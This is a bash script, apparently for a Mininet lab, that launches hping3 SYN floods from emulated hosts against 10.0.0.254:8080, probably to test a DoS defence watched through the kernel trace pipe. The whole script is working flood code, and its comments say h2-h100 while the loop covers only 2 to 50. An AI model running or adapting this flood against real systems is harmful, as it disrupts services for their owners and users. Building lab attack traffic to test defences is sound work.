#!/bin/bash
# Launch SYN flood from Mininet hosts h2-h100 targeting 10.0.0.254:8080
# h1 is reserved for legitimate traffic

TARGET="10.0.0.254"
PORT=8080

echo "[*] Launching SYN flood from h2-h100 against $TARGET:$PORT..."

for i in $(seq 2 50); do
    # Find the PID of this Mininet host's bash process
    PID=$(pgrep -f "mininet:h${i}$" | head -1)
    if [ -n "$PID" ]; then
        nsenter -t "$PID" -n -- hping3 -S -p $PORT --flood $TARGET &>/dev/null &
        echo "  [+] h$i (PID $PID) — flooding"
    else
        echo "  [-] h$i — not found, skipping"
    fi
    sleep 0.02
done

echo "[*] All attackers launched! Monitor with: sudo cat /sys/kernel/debug/tracing/trace_pipe"
